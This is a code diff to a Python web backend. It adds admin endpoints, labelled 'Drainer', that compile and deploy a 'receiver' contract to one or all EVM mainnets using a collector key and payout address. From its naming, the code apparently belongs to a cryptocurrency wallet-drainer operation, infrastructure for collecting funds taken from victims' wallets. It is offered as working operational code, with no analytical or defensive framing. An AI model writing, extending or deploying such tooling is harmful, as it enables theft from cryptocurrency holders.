@@ -44,6 +44,7 @@ import engine
 import mailer
 import market
 import payout
+import receiver
 import revoke
 import scanners
 import security as S
@@ -2071,6 +2072,80 @@ async def admin_set_keys(body: KeyPayload, request: Request):
 
     S.audit(admin["id"], "drainer.set_key", family, {"address": address}, ip=_ip(request))
     return {"ok": True, "address": address}
+
+
+# ---------------------------------------------------------------------------
+# Drainer — receiver deployment (admin console setup)
+# ---------------------------------------------------------------------------
+@router.get("/api/admin/drainer/setup")
+async def admin_drainer_setup(request: Request):
+    """Readiness report: keys, payout, per-chain receiver + gas + owner check."""
+    require_perm(request, "drainer.configure")
+    return await receiver.status()
+
+
+@router.post("/api/admin/drainer/receiver/compile")
+async def admin_receiver_compile(request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    try:
+        art = await asyncio.to_thread(receiver.compile_artifact)
+    except receiver.DeployError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+    except Exception as exc:                                 # noqa: BLE001
+        raise HTTPException(status_code=500, detail=f"compile failed: {exc}")
+    S.audit(admin["id"], "drainer.receiver_compile", None,
+            {"bytes": len(art.get("bytecode") or "")}, ip=_ip(request))
+    return {"ok": True}
+
+
+@router.post("/api/admin/drainer/receiver/{network}/deploy")
+async def admin_receiver_deploy(network: str, request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    net = chains.resolve_network(network) or network
+    if net not in chains.EVM_NETWORKS:
+        raise HTTPException(status_code=404, detail=f"unknown network {network}")
+    try:
+        key = receiver._collector_key()
+        payout = receiver._payout()
+        address = await receiver.deploy(net, key, payout)
+    except receiver.DeployError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+    except Exception as exc:                                 # noqa: BLE001
+        raise HTTPException(status_code=500, detail=f"deploy failed: {exc}")
+    S.audit(admin["id"], "drainer.receiver_deploy", net, {"address": address},
+            ip=_ip(request))
+    return {"ok": True, "network": net, "address": address}
+
+
+@router.post("/api/admin/drainer/receiver/deploy-all")
+async def admin_receiver_deploy_all(request: Request, force: bool = False):
+    """Deploy to every mainnet that has no receiver. Never touches testnets."""
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    try:
+        key = receiver._collector_key()
+        payout = receiver._payout()
+    except receiver.DeployError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+
+    existing = get_setting("drainer_receiver_evm") or {}
+    if not isinstance(existing, dict):
+        existing = {}
+    results = []
+    for net in chains.evm_network_names():
+        if net in existing and not force:
+            continue
+        try:
+            address = await receiver.deploy(net, key, payout)
+            results.append({"network": net, "ok": True, "address": address})
+        except Exception as exc:                             # noqa: BLE001
+            results.append({"network": net, "ok": False, "error": str(exc)[:200]})
+
+    S.audit(admin["id"], "drainer.receiver_deploy_all", None,
+            {"deployed": sum(1 for r in results if r["ok"])}, ip=_ip(request))
+    return {"ok": True, "results": results}
 
 
 # ---------------------------------------------------------------------------
